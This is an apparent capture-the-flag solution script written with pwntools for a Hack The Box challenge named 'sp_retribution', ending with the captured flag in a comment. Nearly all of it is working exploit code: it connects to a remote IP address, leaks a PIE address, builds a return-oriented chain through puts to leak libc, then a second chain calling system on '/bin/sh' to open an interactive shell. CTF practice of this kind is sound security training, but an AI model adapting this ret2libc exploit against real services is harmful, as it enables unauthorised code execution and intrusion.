#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sp_retribution
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sp_retribution')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *missile_launcher+117
b *missile_launcher+163
b *missile_launcher+201
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

#io = start(env={'LD_PRELOAD':'./glibc/libc.so.6'})
io = remote('134.209.26.243', 31457)
junk = b'A'*0x1f

io.sendline(b'2')
io.sendafter(b'y = ', b'A'*0x8 + b'\x01')
io.recvuntil('[*] New coordinates: x = [0x53e5854620fb399f], y = AAAAAAAA')
pie_leak = int.from_bytes(io.recvline().rstrip(),'little')
print(f'[+] PIE leak: {hex(pie_leak)}')
pie_base = pie_leak - 3329
print(f'[+] PIE base: {hex(pie_base)}')
start = pie_base + 2048

pop_rdi_ret = pie_base + 0xd33
puts_got = pie_base + 0x202f90
puts_plt = pie_base + 0x760
ret = pie_base + 0x746

payload = b'B'*88
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(start)

io.send(payload)
io.recvuntil(b'reset!')
io.recvline()
libc_leak = int.from_bytes(io.recvline().rstrip(), 'little')
print(f'[+] libc leak: {hex(libc_leak)}')
base = libc_leak - 0x06f6a0
print(f'[+] libc base: {hex(base)}')

binsh = base + 0x18ce57
system = base + 0x0453a0

payload2 = b'C'*88
payload2 += p64(pop_rdi_ret)
payload2 += p64(binsh)
payload2 += p64(system)
payload2 += p64(ret)

io.sendline(b'2')
io.sendafter(b'y = ', b'A'*8 + b'\x01')
io.sendafter(b'y/n): ', payload2)

io.interactive()
# HTB{d0_n0t_3v3R_pr355_th3_butt0n}
